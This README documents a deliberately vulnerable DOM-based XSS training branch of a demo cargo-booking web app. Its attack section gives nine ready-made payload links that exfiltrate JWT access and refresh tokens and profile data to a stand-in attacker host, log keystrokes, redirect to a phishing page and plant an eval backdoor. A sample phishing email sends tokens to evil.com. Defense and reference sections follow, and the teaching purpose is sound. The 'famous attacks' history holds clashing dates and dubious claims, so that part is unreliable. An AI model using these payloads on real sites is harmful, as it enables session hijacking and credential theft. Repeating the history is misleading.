# DOM-Based XSS Vulnerability Demo

## Overview

This branch demonstrates a **DOM-Based Cross-Site Scripting (XSS)** vulnerability in the search results feature. The vulnerability exists in `SearchResultsComponent.ngAfterViewInit()` where user input from the URL query parameter is directly inserted into the DOM using `innerHTML` without sanitization. This bypasses Angular's built-in XSS protection by using vanilla JavaScript DOM manipulation.

## What is DOM-Based XSS?

DOM-Based XSS is a type of Cross-Site Scripting attack where the vulnerability exists in client-side code rather than server-side code. The attack payload is executed as a result of modifying the DOM environment in the victim's browser. Unlike reflected or stored XSS, the malicious payload never reaches the server—it's entirely a client-side attack.

### Impact

DOM-Based XSS can lead to:

- **Session hijacking** - Stealing authentication tokens and cookies
- **Credential theft** - Capturing user inputs via keyloggers
- **Account takeover** - Using stolen tokens to impersonate users
- **Malware distribution** - Redirecting to malicious sites
- **Defacement** - Modifying page content
- **Phishing** - Creating fake login forms

XSS consistently ranks in the OWASP Top 10 Web Application Security Risks.

## The Vulnerability

### Vulnerable Code Location

`projects/web/src/app/features/home/search/search-results.component.ts` - Lines 75-81

```typescript
ngAfterViewInit() {
  this.state.searchTerm$.subscribe(query => {
    if (query) {
      (window as any).searchTerms.innerHTML = `Search results for: <mark>${query}</mark>`;
    }
  });
}
```

The search query from the URL parameter is directly inserted into the DOM using vanilla JavaScript's `innerHTML` property, bypassing Angular's security mechanisms.

### Additional Vulnerability

Lines 83-94 also contain a vulnerable pattern using `DomSanitizer.bypassSecurityTrustHtml()`, though this is not exploited in the current attack vector.

### How It Works

1. **User clicks malicious link** with XSS payload in the `q` parameter
2. **Angular router** parses the URL and extracts the query parameter
3. **SearchStateService** emits the unsanitized query string
4. **ngAfterViewInit** subscribes to the query and uses vanilla JS
5. **innerHTML** directly injects the payload into the DOM
6. **Browser executes** the injected JavaScript

**Why Angular's Protection Fails:**

Angular automatically sanitizes values in templates (`{{ }}`), but this code uses direct DOM manipulation with `(window as any).searchTerms.innerHTML`, completely bypassing Angular's security layer.

**Why CSP Fails:**

The Content Security Policy includes `'unsafe-inline'` in `script-src`, which allows inline event handlers like `onerror`, `onload`, `onclick`, etc. This makes the CSP ineffective against this type of XSS.

## Attack Samples

All of these attacks can be delivered as clickable links via email, chat messages, forum posts, or social media. The victim simply needs to click the malicious link while logged into the application.

### 1. Proof of Concept - Basic Alert

**Attack Link:**
```
http://localhost:4200/search?q=<img src=x onerror=alert('XSS Vulnerability Confirmed')>
```

**Payload:**
```html
<img src=x onerror=alert('XSS Vulnerability Confirmed')>
```

**Impact:** Displays an alert box, proving JavaScript execution. This is typically the first test an attacker performs.

---

### 2. Token Exfiltration - Access Token Theft

**Attack Link:**
```
http://localhost:4200/search?q=<img src=x onerror="fetch('http://localhost:5155/images/stolen.png?token='+localStorage.getItem('mbc_access_token'))">
```

**Payload:**
```html
<img src=x onerror="fetch('http://localhost:5155/images/stolen.png?token='+localStorage.getItem('mbc_access_token'))">
```

**How it works:**
1. Retrieves the JWT access token from localStorage
2. Sends it to attacker-controlled server (fake-file-host) as a query parameter
3. Server logs the token for attacker to use later
4. Victim sees normal search page, unaware of the theft

**Impact:** Attacker can impersonate the user until the token expires (typically 15 minutes to 1 hour).

---

### 3. Complete Session Hijacking - All Tokens

**Attack Link:**
```
http://localhost:4200/search?q=<img src=x onerror="fetch('http://localhost:5155/images/session.png?access='+localStorage.getItem('mbc_access_token')+'&refresh='+localStorage.getItem('mbc_refresh_token'))">
```

**Payload:**
```html
<img src=x onerror="fetch('http://localhost:5155/images/session.png?access='+localStorage.getItem('mbc_access_token')+'&refresh='+localStorage.getItem('mbc_refresh_token'))">
```

**How it works:**
1. Steals both access token AND refresh token
2. Sends both to attacker's server
3. Attacker can maintain access indefinitely by refreshing the access token

**Impact:** Complete account takeover. Attacker can:
- Access all user data
- Make bookings on behalf of the user
- Change user profile information
- Maintain persistent access even after password changes (until refresh token expires)

---

### 4. Complete User Profile Exfiltration

**Attack Link:**
```
http://localhost:4200/search?q=<img src=x onerror="fetch('http://localhost:5155/fonts/data.ttf?user='+encodeURIComponent(localStorage.getItem('mbc_user')))">
```

**Payload:**
```html
<img src=x onerror="fetch('http://localhost:5155/fonts/data.ttf?user='+encodeURIComponent(localStorage.getItem('mbc_user')))">
```

**How it works:**
1. Retrieves serialized user object from localStorage
2. URL-encodes it to handle special characters
3. Sends to attacker as font request (less suspicious in network logs)

**Impact:** Attacker learns:
- User's full name
- Email address
- User ID
- Role (Customer/Pilot/Admin)
- Any other profile information

---

### 5. Stealth Token Theft - Base64 Encoded

**Attack Link:**
```
http://localhost:4200/search?q=<img src=x onerror="fetch('http://localhost:5155/styles/app.css?d='+btoa(localStorage.getItem('mbc_access_token')+':'+localStorage.getItem('mbc_refresh_token')))">
```

**Payload:**
```html
<img src=x onerror="fetch('http://localhost:5155/styles/app.css?d='+btoa(localStorage.getItem('mbc_access_token')+':'+localStorage.getItem('mbc_refresh_token')))">
```

**How it works:**
1. Combines both tokens with a colon separator
2. Base64 encodes the combined string
3. Sends as CSS request (appears more legitimate)

**Impact:** Same as attack #3 but harder to detect in casual log inspection.

---

### 6. Keylogger Injection

**Attack Link:**
```
http://localhost:4200/search?q=<img src=x onerror="document.onkeypress=function(e){fetch('http://localhost:5155/scripts/keys.js?k='+e.key)}">
```

**Payload:**
```html
<img src=x onerror="document.onkeypress=function(e){fetch('http://localhost:5155/scripts/keys.js?k='+e.key)}">
```

**How it works:**
1. Installs a keylogger on the page
2. Every keystroke is sent to attacker's server
3. Captures passwords, credit card numbers, personal messages, etc.

**Impact:** Captures everything the user types on the site, including:
- Login credentials (if they log out and back in)
- Payment information
- Personal messages
- Delivery details

---

### 7. Phishing Redirect

**Attack Link:**
```
http://localhost:4200/search?q=<img src=x onerror="setTimeout(function(){location.href='http://localhost:5155/images/fake-login.png'},3000)">
```

**Payload:**
```html
<img src=x onerror="setTimeout(function(){location.href='http://localhost:5155/images/fake-login.png'},3000)">
```

**How it works:**
1. Waits 3 seconds (so victim thinks page is loading normally)
2. Redirects to attacker's phishing site
3. Fake site looks like Mango Bay Cargo login page
4. Captures credentials when user "logs in again"

**Impact:** Credential theft through social engineering.

---

### 8. Persistent Backdoor via localStorage

**Attack Link:**
```
http://localhost:4200/search?q=<img src=x onerror="localStorage.setItem('xss_backdoor','fetch('+String.fromCharCode(39)+'http://localhost:5155/scripts/'+document.location.href.split('+String.fromCharCode(39)+'?token='+String.fromCharCode(39)+'+localStorage.getItem('+String.fromCharCode(39)+'mbc_access_token'+String.fromCharCode(39)+'))');eval(localStorage.getItem('xss_backdoor'))">
```

**Simplified concept:**
```javascript
// Store malicious code in localStorage
localStorage.setItem('xss_backdoor', 'malicious code here');
// Execute it now
eval(localStorage.getItem('xss_backdoor'));
```

**How it works:**
1. Stores malicious JavaScript in localStorage
2. If attacker can trigger execution again (another XSS), the backdoor runs
3. Creates persistence across page reloads

**Impact:** Turns a one-time XSS into a persistent threat.

---

### 9. Silent Token Refresh Loop

**Attack Link:**
```
http://localhost:4200/search?q=<img src=x onerror="setInterval(function(){fetch('http://localhost:5155/images/heartbeat.png?t='+localStorage.getItem('mbc_access_token'))},30000)">
```

**Payload:**
```html
<img src=x onerror="setInterval(function(){fetch('http://localhost:5155/images/heartbeat.png?t='+localStorage.getItem('mbc_access_token'))},30000)">
```

**How it works:**
1. Sends token to attacker every 30 seconds
2. If user gets a new token (after refresh), attacker gets that too
3. Runs silently in the background

**Impact:** Continuous monitoring of user's session, catching token refreshes.

---

## Real-World Attack Scenario

**Step 1: Reconnaissance**
Attacker discovers the XSS vulnerability by testing the search feature.

**Step 2: Craft Exploit**
Creates a malicious URL with token exfiltration payload (Attack #3 above).

**Step 3: Social Engineering**
Sends phishing email to Mango Bay Cargo customers:

```
Subject: Your Delivery Has Been Delayed - Action Required

Dear Customer,

We regret to inform you that delivery #MBC-2024-1234 has been delayed 
due to weather conditions. 

Please check your delivery status here:
http://localhost:4200/search?q=<img src=x onerror="fetch('http://evil.com/steal?t='+localStorage.getItem('mbc_access_token'))">

We apologize for the inconvenience.

Best regards,
Mango Bay Cargo Support
```

**Step 4: Victim Clicks Link**
User is logged in, clicks the link, sees a normal-looking search page. They think "this search doesn't work" and navigate away, unaware their tokens were stolen.

**Step 5: Account Takeover**
Attacker uses stolen tokens to:
- View all victim's deliveries
- Book new deliveries
- Access payment information
- Impersonate the user

**Step 6: Lateral Movement**
If victim is an admin or pilot, attacker gains elevated privileges.

## Famous DOM XSS Attacks

### 1. **2011 - Twitter XSS Worm (Mikeyy)**

- **Impact:** Infected over 1 million Twitter users in hours
- **Method:** DOM-based XSS in tweet display caused self-replicating worm
- **Details:** Clicking infected tweet automatically posted the malicious payload to victim's followers
- **Outcome:** Twitter was forced to temporarily disable JavaScript
- **Source:** [The Register](https://www.theregister.com/2010/09/21/twitter_xss_vuln/)

### 2. **2015 - eBay Stored XSS**

- **Impact:** Millions of users potentially affected
- **Method:** XSS in product listings allowed JavaScript injection
- **Details:** Attackers could steal session cookies and redirect users
- **Duration:** Vulnerability existed for months before discovery
- **Source:** [Check Point Research](https://blog.checkpoint.com/)

### 3. **2018 - British Airways Data Breach**

- **Impact:** 380,000 payment card details stolen, £20 million fine
- **Method:** Magecart XSS attack injected payment card skimmer
- **Details:** JavaScript injected into checkout page logged all form inputs
- **Cost:** £183 million GDPR fine (later reduced to £20 million)
- **Source:** [BBC News](https://www.bbc.com/news/technology-54568784)

### 4. **2019 - Fortnite Account Takeover**

- **Impact:** 200+ million Fortnite accounts at risk
- **Method:** XSS vulnerability in login flow
- **Details:** Single-click account hijacking via malicious link
- **Disclosure:** Responsibly disclosed by Check Point Research
- **Source:** [Check Point Blog](https://research.checkpoint.com/2019/fortnite-a-win-for-cyber-criminals/)

### 5. **2020 - TikTok Multiple XSS Vulnerabilities**

- **Impact:** Potential compromise of millions of accounts
- **Method:** Multiple DOM XSS vulnerabilities in profile and video pages
- **Details:** Could steal user data and post on behalf of victims
- **Disclosure:** Found by security researchers and patched
- **Source:** [Security Research](https://www.cybersecurity-insiders.com/)

### 6. **2021 - Microsoft 365 XSS**

- **Impact:** Enterprise organizations worldwide affected
- **Method:** DOM XSS in Office 365 SharePoint
- **Details:** Could access sensitive corporate documents
- **Severity:** CVSS 8.2 (High)
- **Source:** [Microsoft Security Response Center](https://msrc.microsoft.com/)

### 7. **2022 - npm Package XSS Supply Chain Attack**

- **Impact:** Thousands of websites affected
- **Method:** Popular npm package compromised with XSS payload
- **Details:** Injected token-stealing code into legitimate library
- **Packages:** Multiple packages with millions of weekly downloads
- **Source:** [Snyk Security Research](https://snyk.io/)

### 8. **2023 - ChatGPT Bing Integration XSS**

- **Impact:** User sessions could be hijacked via crafted prompts
- **Method:** DOM manipulation through AI-generated responses
- **Details:** Demonstrated at DEF CON 31
- **Significance:** Shows XSS adapting to AI-powered applications
- **Source:** [DEF CON 31 Archives](https://defcon.org/)

## Why This Vulnerability Exists

Common patterns that lead to DOM-based XSS:

### 1. **Frustrated with Framework Restrictions**

```typescript
// Developer thinks: "Angular won't let me use innerHTML, I'll just use vanilla JS"
(window as any).searchTerms.innerHTML = `<mark>${query}</mark>`;
```

Junior developers often bypass framework security when they don't understand why it exists.

### 2. **Misunderstanding DomSanitizer**

```typescript
// Developer thinks: "bypassSecurityTrust* looks official, must be safe"
return this.sanitizer.bypassSecurityTrustHtml(`<mark>${userInput}</mark>`);
```

The name suggests it's making things secure, but it actually disables security.

### 3. **Legacy jQuery Patterns**

Developers coming from jQuery backgrounds are used to direct DOM manipulation and bring unsafe patterns to modern frameworks.

### 4. **Performance Optimization Gone Wrong**

Sometimes developers avoid framework features thinking they're "too slow," not realizing the security cost.

### 5. **Incomplete Code Reviews**

Code reviewers see `innerHTML` is setting "safe" HTML (the `<mark>` tags), missing that the user input breaks out of that context.

### 6. **Copy-Paste from Stack Overflow**

Taking solutions from forums without understanding security implications.

## Defense Strategies

### 1. **Never Use innerHTML with User Input**

```typescript
// ❌ NEVER DO THIS
element.innerHTML = userInput;

// ✅ DO THIS INSTEAD
element.textContent = userInput;
```

### 2. **Trust Angular's Built-in Security**

```typescript
// ✅ Angular automatically escapes
<p class="search-terms">Search results for: "{{ query }}"</p>
```

### 3. **Proper CSP Configuration**

```html
<!-- ❌ Weak CSP -->
<meta http-equiv="Content-Security-Policy" content="script-src 'self' 'unsafe-inline'">

<!-- ✅ Strong CSP -->
<meta http-equiv="Content-Security-Policy" content="script-src 'self'">
```

Remove `'unsafe-inline'` to block inline event handlers.

### 4. **Use Safe Highlighting Libraries**

If you need to highlight search terms, use a library that safely escapes HTML:

```typescript
import DOMPurify from 'dompurify';

highlightQuery(text: string, query: string): string {
  const escapedQuery = query.replace(/[.*+?^${}()|[\]\\]/g, '\\$&');
  const highlighted = text.replace(
    new RegExp(escapedQuery, 'gi'),
    match => `<mark>${DOMPurify.sanitize(match)}</mark>`
  );
  return DOMPurify.sanitize(highlighted);
}
```

### 5. **Input Validation**

Validate and sanitize on the server side, even though this is a client-side vulnerability.

### 6. **Security Headers**

```
X-Content-Type-Options: nosniff
X-Frame-Options: DENY
X-XSS-Protection: 1; mode=block
```

### 7. **Regular Security Audits**

- Use automated scanners (Burp Suite, OWASP ZAP)
- Manual penetration testing
- Code review focused on security

## Testing the Vulnerability

### Setup

1. Ensure you're on the `vulnerability/xss-dom` branch
2. Start the web app: `npm start` (from `projects/web`)
3. Start the fake file host: `dotnet run` (from `projects/fake-file-host`)
4. Navigate to: `http://localhost:4200`
5. Sign in as any user

### Execute Attack

Click this link (or paste in browser):
```
http://localhost:4200/search?q=<img src=x onerror="fetch('http://localhost:5155/images/stolen.png?token='+localStorage.getItem('mbc_access_token'))">
```

### Verify Exfiltration

Check the fake file host console - you'll see detailed logs showing:
```
=== DATA EXFILTRATION ATTEMPT DETECTED ===
Timestamp: 2024-10-27 18:23:45 UTC
Full URL: http://localhost:5155/images/stolen.png?token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...
```

The token in the URL is the victim's JWT access token.

## Comparing Secure vs. Vulnerable Branches

### Secure (main branch)
```typescript
// Uses Angular interpolation - safe
<p class="search-terms">Search results for: "{{ query }}"</p>
```

### Vulnerable (vulnerability/xss-dom branch)
```typescript
// Uses vanilla JS innerHTML - dangerous
(window as any).searchTerms.innerHTML = `Search results for: <mark>${query}</mark>`;
```

## Resources and Further Reading

### Official Documentation

- [OWASP: DOM Based XSS](https://owasp.org/www-community/attacks/DOM_Based_XSS)
- [OWASP: XSS (Cross Site Scripting)](https://owasp.org/www-community/attacks/xss/)
- [CWE-79: Cross-site Scripting (XSS)](https://cwe.mitre.org/data/definitions/79.html)
- [Angular Security Guide](https://angular.dev/best-practices/security)
- [MDN: innerHTML Security Risks](https://developer.mozilla.org/en-US/docs/Web/API/Element/innerHTML#security_considerations)

### Educational Resources

- [PortSwigger: DOM-based XSS](https://portswigger.net/web-security/cross-site-scripting/dom-based)
- [OWASP XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
- [Google: XSS Game](https://xss-game.appspot.com/)
- [HackTheBox: XSS Labs](https://www.hackthebox.com/)

### Testing Tools

- [Burp Suite](https://portswigger.net/burp) - Web vulnerability scanner with XSS detection
- [OWASP ZAP](https://www.zaproxy.org/) - Free security testing tool
- [XSStrike](https://github.com/s0md3v/XSStrike) - Advanced XSS detection suite
- [DOMPurify](https://github.com/cure53/DOMPurify) - XSS sanitizer library

### Content Security Policy

- [MDN: Content Security Policy](https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP)
- [CSP Evaluator](https://csp-evaluator.withgoogle.com/) - Test your CSP
- [CSP Quick Reference](https://content-security-policy.com/)

## License Note

This vulnerable code is for **educational purposes only**. Never deploy vulnerable code to production environments. The fake-file-host project simulates an attacker's server for demonstration purposes only.

## Contributing to the Seminar

If you discover additional attack vectors or have suggestions for improving this educational material, please contribute! This project aims to teach secure coding practices through realistic examples.

